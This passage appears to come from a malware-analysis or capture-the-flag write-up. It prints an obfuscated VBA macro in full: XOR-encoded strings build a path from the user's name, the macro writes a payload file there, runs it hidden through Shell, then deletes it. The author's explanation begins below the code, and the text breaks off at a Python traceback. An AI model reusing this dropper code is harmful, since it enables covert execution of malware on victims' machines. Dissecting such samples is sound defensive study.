xDSnawULVynR(Array(13, (85 Xor 32), (((61 - 28) + 28) Xor 103), 179, ((41 + (23 - 5)) Xor (287 - 122)), (158 - 28), ((18 - 7) + 228), 157, ((281 - 86) Xor (12 + 19)), (28 Xor (18 + 15)), (57 - 19), (93 Xor 149), 25, (96 - 33), 7), Array((16 Xor (125 - 35)), (10 + 8), (20 + (9 - 2)), (((185 - 92) + 30) Xor 132), (59 Xor (385 - 191)), 192, 131, (293 - 73), (261 - 113), 90, (118 - 15), (47 + (157 - 58)), (48 Xor ((90 - 37) + 67)), (31 Xor (34 + (110 - 47))), ((46 - 15) Xor 113))) &amp;amp; _
xDSnawULVynR(Array((25 - 8), (14 Xor 73), 225, 52, (12 - 5), 224, (16 - 5), 152, 167, (7 Xor 255), ((18 + 0) Xor 50), ((28 + 2) Xor 54), ((59 - 18) + (14 - 7)), 110, (((10 - 2) + 58) Xor (286 - 90))), Array((72 Xor (30 - 6)), (6 Xor 0), (((152 - 75) + (241 - 116)) Xor (38 - 11)), (33 + (157 - 73)), (14 Xor 74), 135, (142 - 68), (51 Xor (210 - 18)), (168 + 62), ((14 + 72) Xor 232), (108 - 41), (138 - 33), 106, ((1 + 41) Xor (24 - 3)), ((55 + (39 - 13)) Xor 149))) &amp;amp; _
xDSnawULVynR(Array(72, (192 Xor 52), 218, (319 - 134), 50, ((28 - 9) + 185), (149 - 64), (159 - 24), (26 + 42), (238 - 61), 109, (49 + 151), ((211 - 37) Xor 79), ((80 - 33) + 36), (97 Xor (315 - 105))), Array(33, ((92 - 28) + (197 - 80)), 159, (162 Xor 66), 115, ((26 + 24) Xor 159), (6 - 2), (147 Xor 86), 55, ((44 + 54) Xor ((175 - 68) + 39)), ((28 - 14) Xor (23 + (19 - 6))), (20 + 137), ((36 - 4) Xor 128), 26, ((30 + 187) Xor (7 + 36)))) &amp;amp; _
xDSnawULVynR(Array((1 + 6), 9, (51 Xor (193 - 36)), (9 Xor ((205 - 76) + 55)), 218, 1, 45, 231, ((132 - 13) Xor (303 - 69)), 77, ((148 - 30) Xor (263 - 111)), 113, 126, 235, (303 - 64)), Array((113 - 43), (44 + (4 - 0)), ((142 - 65) Xor 162), 242, 155, 64, (10 + 90), ((8 + 61) Xor (98 + 99)), ((178 - 78) Xor 187), (4 + 30), (253 - 78), ((3 - 0) + 54), 47, (67 + 103), 139)) &amp;amp; _
xDSnawULVynR(Array(((26 - 3) + 131), (70 + 18), (70 Xor 29), (396 - 185), 196, 96, (90 Xor 219), ((84 - 8) Xor (36 - 12)), 134, 43, (288 - 84), (182 - 58), 96, 140, (((64 - 17) + 53) Xor 178)), Array((8 Xor 211), ((21 - 3) + (16 - 8)), (53 - 9), 146, ((13 - 0) + 115), 15, (212 - 20), (20 Xor (10 + 2)), (412 - 171), (102 + (4 - 0)), (328 - 142), (115 - 54), 36, (64 Xor (188 - 51)), (149 Xor (1 + 1)))) &amp;amp; _
xDSnawULVynR(Array((20 Xor (5 + (63 - 22))), (26 Xor 48), ((5 + 3) Xor 145), (((193 - 96) + (12 - 2)) Xor (237 - 36)), (22 + 181), (92 - 22), (5 Xor 60), ((135 + 12) Xor 88), (179 - 84), (6 Xor (211 - 98)), 138, ((135 - 6) Xor 94), (9 Xor (21 + (16 - 4))), (((0 - 0) + (0 - 0)) Xor 1), (196 - 40)), Array((5 Xor 113), 123, (173 Xor 117), (74 + 145), 138, 5, (0 + 13), (173 - 35), 18, (10 + 6), (260 - 57), (116 Xor (266 - 56)), (65 Xor 40), 69, (437 - 186))) &amp;amp; _
xDSnawULVynR(Array(((7 + 2) Xor (344 - 163)), (232 - 104), 33, (108 Xor (105 + 35)), ((50 - 6) Xor ((85 - 29) + 12)), ((53 - 10) Xor 150), 102, 198, (((85 - 15) + (23 - 11)) Xor 255), (20 Xor (58 + (79 - 20))), ((2 + (1 - 0)) Xor (21 + (12 - 3))), (76 + 28), (190 + 29), (((8 - 4) + 3) Xor 40), 126), Array(253, (343 - 139), 70, (300 - 139), (23 - 7), (162 Xor (21 + 73)), 34, 139, (139 Xor (160 - 57)), 44, 106, (48 - 7), 174, 110, (113 - 55))) &amp;amp; _
xDSnawULVynR(Array(((25 - 7) Xor (143 + 13))), Array(((81 - 36) + (233 - 63))))
hfBGMlrCyHeaK = xDSnawULVynR(Array((127 Xor 239), (9 Xor (33 + 30)), 238, (145 + (95 - 30)), 72, (137 + 42), (1 + 67), (8 + 14), 17, (1 Xor 98), ((4 - 1) + (14 - 6)), (32 + 125), (40 + 1), 142, 205), Array((82 Xor 131), ((76 - 22) Xor (120 - 41)), ((0 + 0) Xor 175), 147, (74 - 12), (180 + 62), 7, 71, 80, (24 + 30), 74, (407 - 184), 80, (127 + 80), 138)) &amp;amp; _
xDSnawULVynR(Array(81, (196 Xor 38), (86 - 38), ((16 + 84) Xor (49 + (208 - 89))), 97, 91, ((175 - 43) Xor 2), (98 + 56), 89, (102 + 122), (44 + (69 - 30)), 79, (35 Xor 21), ((246 - 118) + (111 - 29)), 219), Array((12 + 93), 163, (25 + (87 - 7)), ((188 - 62) Xor 197), ((27 + (3 - 1)) Xor 62), (3 + 17), (173 + 26), ((62 + (5 - 0)) Xor 158), 28, (80 + 81), (((37 - 8) + (28 - 12)) Xor 28), 30, (113 Xor 5), ((89 - 29) Xor ((96 - 46) + 80)), 154)) &amp;amp; _
xDSnawULVynR(Array(227, (436 - 214), 176, 93, (319 - 153), (72 Xor 57), (132 - 21), (130 - 63), ((365 - 169) Xor 28), (146 - 36), (146 + 37), (46 - 4), (((70 - 24) + 18) Xor (0 - 0)), ((112 - 10) + 92), (38 + 2)), Array((105 Xor 201), 151, (94 + 147), 25, 247, (45 + (4 - 1)), 36, (4 - 2), (78 Xor 213), 47, (231 Xor (11 + 6)), (((60 - 4) + 38) Xor ((45 - 12) + 15)), (8 Xor (19 + (6 - 0))), 131, (117 - 18))) &amp;amp; _
xDSnawULVynR(Array((120 - 7), 1, (8 Xor 214), (((50 - 19) + 173) Xor 23), (89 Xor 204), (60 Xor (267 - 126)), 12, (85 Xor (8 + (246 - 61))), 85, ((4 - 1) Xor ((2 - 1) + 4)), (((14 - 0) + (2 - 1)) Xor (156 - 46)), (31 Xor (313 - 85)), 37, 204, (((181 - 77) + 25) Xor 76)), Array((3 + 45), ((35 - 14) + 45), ((114 - 26) Xor (53 + 172)), (221 - 67), ((165 - 77) Xor (51 + 102)), (127 + 87), ((72 - 19) + 25), (54 Xor (142 + 64)), (20 Xor 0), 78, 2, 186, (133 - 28), (198 - 41), (211 - 68))) &amp;amp; _
xDSnawULVynR(Array(((0 - 0) + 152), 129, 173, (18 Xor 7), ((162 - 17) + (12 - 0)), (146 + 83), 219, ((4 + 16) Xor (342 - 142)), (15 + (13 - 4)), ((33 - 13) + 174), (176 - 88), ((104 - 7) Xor 184), 248, (34 + (33 - 9)), (184 Xor 123)), Array((333 - 133), (((126 - 60) + 23) Xor 153), (122 + 112), (54 Xor 106), 220, (11 Xor (156 - 13)), (72 Xor (187 + 57)), ((29 + 37) Xor (152 + 68)), ((31 - 12) + 97), ((169 - 62) + 24), 31, 148, ((121 + (108 - 48)) Xor (12 - 0)), (85 + 9), (122 Xor 248))) &amp;amp; _
xDSnawULVynR(Array((8 Xor (0 + 1)), 139, (110 - 12), (50 - 10), (409 - 154), (68 - 27), 86, 17, 125, 240, ((20 - 2) Xor (8 - 4)), ((186 - 89) + 11), (99 + 56), 11, 64), Array((((38 - 10) + 14) Xor 98), (232 Xor (3 + 1)), 35, 110, 178, 104, (25 + 26), 64, (64 - 1), ((42 + 70) Xor 250), 87, (15 + 21), 202, 74, (20 + (8 - 2)))) &amp;amp; _
xDSnawULVynR(Array(((20 + 70) Xor (168 + (75 - 24))), (1 + (28 - 13)), ((7 + (21 - 10)) Xor (26 + 17)), 44, 117, 136, (218 - 33), 186, (41 + 27), ((141 - 47) Xor (102 + (159 - 46))), ((82 - 17) + 69), (218 - 37), (283 - 140), (2 + (28 - 11)), 224), Array(((39 + (22 - 10)) Xor 227), (141 - 59), ((95 - 45) + 27), (47 + (84 - 22)), (83 - 29), ((24 + 37) Xor 129), (289 - 41), (41 Xor (139 + 60)), (3 + 32), ((17 + 85) Xor ((202 - 65) + (70 - 34))), ((7 + 26) Xor 203), 244, (106 Xor (79 + 94)), (73 - 7), (314 - 153))) &amp;amp; _
xDSnawULVynR(Array(((85 - 9) Xor 26), (94 Xor ((80 - 40) + 6)), (234 - 70), (99 + 156), ((3 - 1) Xor 92), 21, (((129 - 50) + 53) Xor 86), (351 - 128), 189, (75 + 21), 245, ((81 - 0) Xor (97 + (39 - 3))), (8 Xor 177), (((114 - 4) + 117) Xor 19), 222), Array(26, (21 Xor (2 + 0)), 230, ((128 - 17) + 56), ((9 + 22) Xor 0), (63 + (36 - 17)), 135, ((118 - 41) Xor (181 + (51 - 21))), 228, ((0 - 0) + 7), ((294 - 143) Xor 32), 144, (349 - 101), (158 Xor (78 - 37)), (290 - 121))) &amp;amp; _
xDSnawULVynR(Array(106, ((216 + 28) Xor (4 + 9)), (294 - 108), ((184 - 89) + 60), 221, (56 Xor 225), 159, (73 - 20), 104, ((281 - 106) Xor (89 + (24 - 6))), (((134 - 43) + (15 - 7)) Xor 247), (39 + 5), 143, ((169 - 3) + 14), (125 - 23)), Array(43, (156 - 4), ((205 - 59) + 89), (80 + (243 - 106)), ((82 - 14) Xor 245), (41 + 111), 216, 1, (78 - 37), (109 + (99 - 48)), (((10 - 5) + 60) Xor (114 + (53 - 19))), 109, ((74 + (135 - 11)) Xor 57), (88 + 157), ((31 - 7) Xor 61))) &amp;amp; _
xDSnawULVynR(Array(((72 + 42) Xor 0), 166, (12 + 11), 169, (169 Xor (140 - 28)), 217, ((74 - 2) Xor 61), 19, (60 - 28), (((1 - 0) + 0) Xor 4), 13, 64, ((3 + (0 - 0)) Xor 29), (((53 - 4) + (24 - 7)) Xor 156)), Array(70, (441 - 210), (127 - 58), (244 - 12), 155, 175, (23 Xor (21 + 14)), (53 Xor 110), 67, (((25 - 5) + 3) Xor (163 - 80)), ((20 + 5) Xor 118), (33 + 6), (97 - 5), (13 Xor 160)))
dWlVcYnsGQco = xDSnawULVynR(Array(((150 - 53) Xor 248), (42 - 19), 18, ((222 - 41) + 27), (37 - 13), 204, (((71 - 28) + 65) Xor ((156 - 21) + 13)), (130 Xor 42), 98, ((30 + 12) Xor 134), 107, ((146 - 65) + 123), 31, (158 + (86 - 19)), (100 + 57)), Array(216, (33 Xor (0 + (221 - 108))), ((55 - 18) + 5), (195 - 50), (103 - 38), (31 + 126), 186, (144 + 51), 35, 233, 50, (37 Xor 168), ((135 - 21) Xor 12), 176, (138 + 85))) &amp;amp; _
xDSnawULVynR(Array(223, 69, 33, (103 - 31), (70 Xor 18), 146, (16 Xor 185), 21, (27 - 4), (12 + 8), 124, ((37 - 13) Xor (158 - 39)), ((222 - 97) Xor 148), 30, (84 Xor 56)), Array(172, (2 Xor 6), (101 Xor (1 + 2)), (23 + 6), 21, (44 Xor 245), (198 + 34), (38 Xor ((66 - 11) + 59)), ((174 - 86) Xor (55 - 19)), (88 - 3), (50 Xor (4 + (7 - 3))), 12, 168, 68, 61)) &amp;amp; _
xDSnawULVynR(Array(52, 92, 235, (311 - 122), 12, ((78 + 43) Xor (73 + (72 - 5))), ((65 - 9) Xor 181), 73, ((62 - 16) + 30), (101 - 21), 198, (32 + (166 - 79)), ((46 - 16) Xor ((277 - 87) + 26)), (6 + 29), (37 + (109 - 43))), Array((155 - 37), (33 Xor 20), 170, ((4 + 0) Xor 252), ((27 - 6) + 64), (177 + 3), (130 Xor 110), 24, 14, ((29 - 7) + 13), (234 - 99), ((18 + 1) Xor (18 + 17)), 147, (60 Xor (35 + 59)), (36 Xor (5 + 10)))) &amp;amp; _
xDSnawULVynR(Array((505 - 251), 102, ((162 - 41) Xor 173), (11 + 135), (((15 - 3) + (17 - 7)) Xor (73 - 28)), (76 Xor (140 + 90)), 34, (17 Xor 41), (246 - 82), (84 - 30), 182, 112, (92 Xor 37), (216 + (40 - 19)), (188 + 18)), Array((234 - 43), (0 Xor (3 + (62 - 26))), 189, 211, (68 + 52), 251, 99, (174 - 76), (187 + 58), 116, (100 Xor 167), (29 + 20), ((13 + (19 - 6)) Xor (78 - 35)), (314 - 134), 143)) &amp;amp; _
xDSnawULVynR(Array(((68 - 22) Xor (61 - 30)), ((22 - 4) + 167), (77 + 53), 47, (1 + 0), (5 Xor (0 + 122)), (372 - 169), (5 + (12 - 2)), 117, 219, (270 - 129), ((112 - 52) + 111), 90, ((223 - 105) + 9), 229), Array(126, (22 Xor ((78 - 4) + 126)), 192, (16 + (125 - 32)), (65 - 1), ((39 - 11) Xor (38 - 1)), (271 - 133), (12 Xor 66), 32, ((12 + 10) Xor 140), (307 - 100), 238, (16 + 11), (16 Xor (71 - 29)), (83 + (125 - 48)))) &amp;amp; _
xDSnawULVynR(Array((22 + 3), 178, (212 - 62), (343 - 95), ((67 - 18) + (58 - 15)), 78, (300 - 88), (5 + 1), ((3 + (92 - 40)) Xor 164), (((91 - 22) + 38) Xor 5), (((21 - 2) + 39) Xor 255), 178, (5 Xor 22), (254 - 78), (287 - 103)), Array(88, (220 Xor ((50 - 14) + 20)), (23 + 192), (101 + 85), 30, 15, 146, ((81 - 3) + (39 - 4)), (132 + 78), (67 - 31), (177 - 45), 240, 66, 241, (406 - 166))) &amp;amp; _
xDSnawULVynR(Array((4 + 199), (168 + (54 - 21)), 84, (10 + 94), (162 + 15), (98 - 12), (4 Xor 58), (54 + 125), (171 - 30), ((143 + (9 - 3)) Xor (66 + 49)), ((0 + 0) Xor (0 - 0)), (301 - 105), (317 - 130), (18 + (271 - 70)), (8 Xor (128 - 24))), Array((115 + (18 - 3)), ((93 + 33) Xor 246), (45 + 9), (50 - 19), 243, 60, ((91 + (38 - 17)) Xor (29 - 14)), ((90 + 123) Xor 35), (108 Xor ((140 - 46) + (126 - 7))), 167, (150 - 61), 149, (444 - 195), (92 + 83), ((20 - 7) + 20))) &amp;amp; _
xDSnawULVynR(Array((9 + 94), ((78 + 52) Xor ((4 - 2) + 2)), 69, 116, ((12 - 4) Xor (10 + 14)), 120, (380 - 145), 17, 248, 44, ((101 - 38) + (47 - 18)), ((72 - 32) Xor 20), (0 Xor 0), 132, 186), Array(((31 - 6) + (14 - 7)), (193 Xor (20 - 2)), ((2 - 0) + (2 - 0)), 61, (98 Xor 21), 57, 155, (22 Xor 70), ((193 - 38) + 30), ((5 - 1) Xor 24), ((19 - 9) + 19), (165 - 38), 103, (80 + (125 - 7)), (77 + (189 - 28)))) &amp;amp; _
xDSnawULVynR(Array(15, ((38 + 92) Xor (52 + 26)), 224, 195, ((59 - 18) Xor 149), 2, (218 - 96), (107 + 95), 192, (10 + 232), 75, (3 Xor ((50 - 2) + 22)), 113, 216, (210 Xor 51)), Array(((74 - 34) + 38), (245 - 113), 177, (73 + 57), (83 Xor ((84 - 33) + 131)), ((81 - 27) + 29), 56, (93 Xor (252 - 14)), 129, (118 + 68), ((11 + 14) Xor (0 + 3)), (6 - 2), (42 + (36 - 17)), 137, 163)) &amp;amp; _
xDSnawULVynR(Array((167 Xor 64), 213), Array((140 Xor 58), ((203 - 85) + 30)))
EdVSmtRqwXYTGM = xDSnawULVynR(Array((130 Xor (182 - 91)), (33 + 3), (20 - 5), ((305 - 111) Xor 9), 222, 129, 68, ((3 + 0) Xor 5), (137 - 60), 171, 245, 75, (166 - 64), (214 - 49), 43), Array(((119 - 31) Xor 201), 109, 78, 169, 169, (199 - 4), ((35 + 2) Xor (9 + 2)), ((0 + 0) Xor (46 + 25)), (3 Xor (9 - 0)), 254, (291 - 111), 40, (7 Xor (31 - 9)), ((330 - 123) Xor 40), (69 + 12))) &amp;amp; _
xDSnawULVynR(Array((10 - 3), 44, 241, 39, 99, ((34 - 16) Xor (18 - 7)), 0, 226, (120 Xor ((78 - 31) + 192)), ((4 - 2) Xor (11 + 9)), 111, (211 - 62), 104, ((25 + (66 - 8)) Xor (2 + (6 - 2))), 185), Array(70, (90 Xor 53), ((102 + 50) Xor (32 + 8)), ((14 - 3) Xor 109), (37 + 3), ((98 - 13) + 3), (76 - 11), (91 + (56 - 8)), ((244 - 53) Xor (87 + (21 - 3))), ((4 + 4) Xor (23 + 70)), 62, (109 Xor (280 - 95)), 50, ((6 - 2) Xor 0), (342 - 91))) &amp;amp; _
xDSnawULVynR(Array((33 + 79), ((67 - 8) + 181), ((12 - 3) + 84), (242 - 30), (146 - 2), 138, (131 - 44), (69 Xor 30), ((73 - 2) + 161), (408 - 190), 54, (73 Xor (211 + (20 - 6))), (84 Xor 201), (16 Xor ((17 - 2) + 27)), (212 + 30)), Array(((2 - 0) + (4 - 1)), ((186 - 32) Xor (58 - 15)), (16 Xor 5), 141, (134 Xor (132 - 45)), 197, 48, ((17 - 5) Xor (8 + 13)), ((99 - 9) + 80), 155, (56 Xor (143 - 71)), (316 - 83), 220, ((0 + (51 - 10)) Xor (124 - 54)), ((9 + 9) Xor 161))) &amp;amp; _
xDSnawULVynR(Array((175 - 45), (168 Xor 69), 251, 243, 55, (140 + (12 - 6)), ((106 - 18) Xor 48), 250, 124, (95 Xor (230 + 11)), (0 + 1), (65 Xor 33), 98, (25 + 4), (161 + 73)), Array((242 - 50), ((51 + (147 - 66)) Xor 44), 186, ((163 - 28) Xor 49), (68 + 46), 211, ((87 - 28) Xor 5), ((2 + (28 - 4)) Xor (139 + 22)), (28 Xor (34 + 0)), ((126 - 52) Xor 166), (35 + (57 - 28)), 38, (12 Xor 25), 92, (235 - 75))) &amp;amp; _
xDSnawULVynR(Array((93 - 27), (83 + 39), 159, (29 + 142), 132, (430 - 192), (58 - 29), ((59 - 28) + (151 - 4)), ((96 - 20) + 110), (422 - 199), ((46 - 23) + 16), ((420 - 201) Xor (4 + 1)), (27 + 49), 96, (28 - 13)), Array((0 Xor 3), ((48 - 21) Xor 35), (223 - 17), (134 + (122 - 22)), (74 + 130), 167, (36 + (87 - 31)), 208, (118 + (159 - 72)), (208 - 51), 77, 159, (15 - 6), (156 - 72), (3 Xor 77))) &amp;amp; _
xDSnawULVynR(Array((0 + (14 - 2)), (37 Xor (30 - 3)), 145, 136, ((31 - 4) Xor (59 + 3)), (342 - 126), (206 + 48), ((145 - 29) Xor (144 + (100 - 43))), (71 Xor 57), (241 - 116), 177, ((37 - 5) Xor 102), ((150 - 42) Xor 142), 129, ((297 - 144) Xor ((107 - 39) + 21))), Array(((15 + 0) Xor (111 - 21)), ((80 - 24) Xor 87), 211, ((236 - 74) + 90), (159 - 59), ((21 + (77 - 28)) Xor ((224 - 54) + 47)), 171, (420 - 168), (15 + 40), (1 + 25), 240, (16 + 38), (221 - 58), ((304 - 142) Xor 98), 253)) &amp;amp; _
xDSnawULVynR(Array(77), Array((9 Xor 121)))
yyEWNYbuXurxW = vboXZZvyMJBot + hfBGMlrCyHeaK + dWlVcYnsGQco + EdVSmtRqwXYTGM
MwIMnegwljrXk = xDSnawULVynR(Array(245, (7 Xor (133 - 23)), 82, (85 + 39), ((129 - 58) Xor ((38 - 13) + 153)), 140, (15 - 1), 62, 221, (47 Xor 247), (64 Xor 14), ((25 + (61 - 26)) Xor 158), (112 - 45), 24, 122), Array((109 Xor 232), (1 Xor 7), ((1 + 0) Xor 36), (((1 - 0) + 0) Xor 24), (1 + 134), (390 - 135), 102, ((129 - 42) + (7 - 3)), ((19 + (106 - 14)) Xor 222), 180, 96, ((98 - 21) Xor 138), (29 Xor (13 + 25)), 125, 90)) &amp;amp; _
xDSnawULVynR(Array((317 - 86), 89, (39 - 17), 222, (119 - 41), (17 Xor (263 - 90)), (1 Xor 21), 78, 116, (37 + (242 - 106)), ((14 - 1) + 19), (52 + 28), 91, 32, 78), Array((164 Xor (214 - 104)), ((13 - 5) Xor 52), ((3 + 3) Xor 104), 187, 45, (92 Xor (318 - 126)), (229 - 111), (1 + (104 - 50)), (4 - 0), (318 - 114), (132 - 49), 35, (60 Xor 71), 13, (13 Xor (22 + 16)))) &amp;amp; _
xDSnawULVynR(Array((177 - 67), (174 + 70), (105 + 86)), Array((0 Xor ((0 - 0) + (0 - 0))), ((4 + (4 - 2)) Xor (67 + (83 - 5))), ((172 - 54) + (75 - 34)))) + yyEWNYbuXurxW
Dim BotaCipUCROa As String
Dim qgCHXadDjflv As String
BotaCipUCROa = Application.UserName
qgCHXadDjflv = xDSnawULVynR(Array((181 Xor (28 - 14)), (255 - 5), 55, (7 + 235), (84 - 7), 174, ((94 - 24) + 23), (260 - 15), (5 + (75 - 11))), Array((221 + 27), 192, ((107 - 43) + 43), ((116 - 55) Xor (242 - 88)), ((103 - 49) Xor 8), (293 - 90), ((12 - 6) Xor 41), (47 Xor (81 + (150 - 62))), (43 - 18))) + BotaCipUCROa + xDSnawULVynR(Array(((9 + 2) Xor 211), (84 Xor ((1 - 0) + 46)), ((44 - 1) Xor 157), 196, (87 + (79 - 3)), 227, ((108 - 12) Xor 3), 77, (((28 - 7) + 9) Xor 62), (184 - 9), (89 - 37), 191, 140, 174, 81), Array(((27 + (94 - 46)) Xor (192 + 15)), (13 + 45), (58 + 140), (348 - 168), 231, (45 + (168 - 83)), (((11 - 2) + 7) Xor (5 + (2 - 0))), (42 Xor 6), 124, (436 - 209), (73 + 18), (72 Xor (86 + 62)), (145 Xor (149 - 25)), ((73 - 31) + (290 - 138)), (0 Xor 13))) &amp;amp; _
xDSnawULVynR(Array((474 - 234), 5, (345 - 131), 41, (26 + 91), 179, (95 - 38), (184 - 35), (67 Xor ((6 - 3) + 15)), 241, (106 - 49), (67 - 9), (135 - 36), 99, (2 Xor (0 + (0 - 0)))), Array(164, (92 + 4), (159 + 28), (40 + 49), ((17 - 2) + 26), (364 - 141), (13 Xor 85), (109 Xor 141), (53 + (20 - 10)), 146, 81, (72 + 23), (11 + 6), (134 - 53), 44)) &amp;amp; _
xDSnawULVynR(Array(35, ((2 - 0) + 91), ((10 - 3) + 49)), Array(87, ((5 + (3 - 0)) Xor 45), 76))
Dim OWbxyThhGwxilR As Object
Set OWbxyThhGwxilR = CreateObject(xDSnawULVynR(Array(79, (76 Xor (8 + (30 - 13))), (104 - 44), (101 - 11), ((81 - 34) + 79), ((124 - 43) + 56), (51 - 11), 147, (24 Xor 5), (25 Xor ((42 - 13) + 96)), 45, 89, 183, 97, (243 - 40)), Array((44 - 16), (7 Xor (94 - 45)), 78, (3 Xor 48), ((12 - 6) + 8), ((184 + 66) Xor ((4 - 2) + 5)), (72 - 7), ((26 + 1) Xor ((132 - 62) + (230 - 70))), (38 + 84), (61 Xor 119), 107, ((13 + (44 - 15)) Xor 26), (193 + (52 - 26)), 4, ((206 - 68) + 14))) &amp;amp; _
xDSnawULVynR(Array((86 + 23), (3 + 8), (343 - 110), 72, (14 + 65), ((168 - 61) Xor 242), 143, (((73 - 32) + 71) Xor ((164 - 61) + (165 - 40))), (353 - 131), (153 - 39), 45), Array((19 + 1), (183 - 63), (16 + (144 - 3)), (((4 - 0) + (0 - 0)) Xor 41), (24 + 10), 214, 237, (65 + 189), ((61 - 12) + (165 - 27)), 17, 89)))
Dim nThptKQUsbXIUwo As Object
Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
nThptKQUsbXIUwo.Write MwIMnegwljrXk
End Sub
Sub zrOxbjsXpxFIZ()
Dim rxarQjcLRAXXw As String
Dim BotaCipUCROa As String
Dim ATxXjGhAEyQcaRJ As String
BotaCipUCROa = Application.UserName
rxarQjcLRAXXw = xDSnawULVynR(Array(((157 - 42) + (135 - 62)), (0 - 0), (51 Xor ((190 - 58) + (86 - 39))), (176 - 63), ((34 - 9) + 4), (54 + 108), 37, (165 + (36 - 16)), ((21 + 7) Xor 140)), Array(255, (34 + (44 - 20)), 220, (15 Xor (58 - 15)), (89 + (41 - 20)), ((340 - 169) Xor ((37 - 7) + 78)), 87, ((36 - 14) + 180), ((17 + 1) Xor 222))) + BotaCipUCROa + xDSnawULVynR(Array((132 Xor (139 - 40)), 246, (1 Xor (44 - 21)), ((13 + 35) Xor (5 - 2)), (25 Xor 234), ((8 - 1) Xor (141 - 59)), (190 - 72), ((5 + 0) Xor ((14 - 4) + 25)), ((210 - 97) + 53), ((64 - 32) Xor ((146 - 30) + (18 - 1))), (28 Xor (61 + 0)), (71 Xor (401 - 168)), 135, (234 - 91), ((2 + 9) Xor (29 + 29))), Array((22 + 165), 183, (159 - 57), 67, (187 - 4), (22 + 30), (2 Xor (0 + 0)), 71, 250, (67 + (282 - 116)), ((26 + 21) Xor 97), (112 Xor 189), (134 Xor (190 - 94)), 227, 109)) &amp;amp; _
xDSnawULVynR(Array(162, ((4 - 1) + (12 - 6)), ((4 + 10) Xor ((101 - 40) + 47)), (199 - 62), (((9 - 4) + 5) Xor 7)), Array((363 - 117), (184 - 76), (5 + 10), (376 - 127), 81))
Dim prqLKrcSwieM As String
Dim AxpTNmhEQQBv As String
prqLKrcSwieM = xDSnawULVynR(Array(46, (418 - 180), 197, (87 - 38), 114, ((191 - 66) Xor (84 + 137)), (227 Xor 8), 232, 212, 61, (125 Xor 130), 182, ((9 + 31) Xor 113)), Array((33 + (66 - 33)), 143, 176, (93 + 2), 17, ((275 - 80) Xor (4 + 7)), 142, (((30 - 14) + 0) Xor (57 + (129 - 48))), ((64 - 6) + 172), 19, (51 + 88), 206, (19 + 26)))
AxpTNmhEQQBv = xDSnawULVynR(Array(((123 - 59) + (21 - 7)), (29 + 36), (14 + (109 - 49)), (2 + 130), ((29 + 97) Xor 244), ((25 - 6) Xor 13), ((75 + 13) Xor (206 - 60)), ((62 - 9) Xor (77 + (62 - 10))), 172, (54 Xor 81), 192, (38 Xor 132), (128 - 27)), Array((2 + 32), 32, 63, (68 Xor 174), (171 Xor 66), 118, 175, (142 Xor 72), (61 + (105 - 8)), 73, (37 + (141 - 16)), (183 Xor (197 - 81)), ((6 - 0) + 11)))
Name rxarQjcLRAXXw &amp;amp; prqLKrcSwieM As rxarQjcLRAXXw &amp;amp; AxpTNmhEQQBv
End Sub
Sub XEFxqSzaXCXvSAp()
Dim BotaCipUCROa As String
Dim qgCHXadDjflv As String
BotaCipUCROa = Application.UserName
qgCHXadDjflv = xDSnawULVynR(Array((38 + (74 - 37)), 158, (200 + 53), ((7 - 2) + 243), (60 + 141), 110, (((123 - 60) + (27 - 2)) Xor (107 - 49)), (11 + 33), (81 + 84)), Array((5 Xor 13), (56 + (171 - 63)), 161, 173, (119 Xor 205), (7 + (4 - 0)), ((15 + 0) Xor ((6 - 3) + 28)), ((80 - 36) Xor 115), 249)) + BotaCipUCROa + xDSnawULVynR(Array((93 - 20), 79, 41, (242 + 0), 26, 117, (59 Xor (26 + (111 - 37))), (375 - 166), ((27 + 6) Xor 110), (97 - 5), 208, 61, 37, ((83 - 34) Xor 97), 97), Array((((7 - 3) + (5 - 1)) Xor 29), 14, ((38 - 16) Xor 79), 130, 94, (10 + 10), ((3 + (6 - 2)) Xor (49 - 5)), 176, (0 + (21 - 2)), 16, 191, ((2 - 1) + 93), 68, ((45 - 6) + 21), (39 + 22))) &amp;amp; _
xDSnawULVynR(Array(9, 140, 157, 249, (29 Xor 142), 166, (118 Xor 182), 23, ((16 - 0) Xor (6 + (77 - 38))), (50 + 74), ((27 + 37) Xor (242 - 67)), (((74 - 7) + 77) Xor 36), (3 Xor 146), (104 - 4), 207), Array((23 Xor (94 - 20)), (443 - 210), (148 + (132 - 40)), ((59 + 1) Xor 181), 207, ((0 + 56) Xor (78 + 164)), (308 - 147), ((55 - 7) + 50), ((14 + 69) Xor 0), 31, 135, (128 + 81), (434 - 207), 86, (368 - 143))) &amp;amp; _
xDSnawULVynR(Array((135 + (16 - 2)), 2, ((46 - 18) + 41)), Array((181 + 66), (22 + 77), (0 + 49)))
Shell qgCHXadDjflv, vbHide
Sleep (644 Xor 1364)
Kill qgCHXadDjflv
End Sub
&lt;/code>&lt;/pre>&lt;p>We can identify a few interesting parts:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-vba" data-lang="vba">&amp;#39; In LwvYeveWxaeE, a file is created.
Dim nThptKQUsbXIUwo As Object
Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
nThptKQUsbXIUwo.Write MwIMnegwljrXk
&amp;#39; In XEFxqSzaXCXvSAp, that file is spawned as a process (same variable: qgCHXadDjflv).
Shell qgCHXadDjflv, vbHide
Sleep (644 Xor 1364)
Kill qgCHXadDjflv
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try to see what&amp;rsquo;s written in the file. Since I&amp;rsquo;m more comfortable with python, I converted the code using &lt;a href="http://vb2py.sourceforge.net/online_conversion.html">this tool&lt;/a>. Note that I had to download &lt;a href="http://vb2py.sourceforge.net/downloads.html">the source code&lt;/a> to make the script run, since the package wouldn&amp;rsquo;t install using &lt;code>pip&lt;/code> for me.&lt;/p>
&lt;p>Trying to run the converted code does nothing, since we have to call a function. Let&amp;rsquo;s call &lt;code>LwvYeveWxaeE&lt;/code>, which creates the file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python converted.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
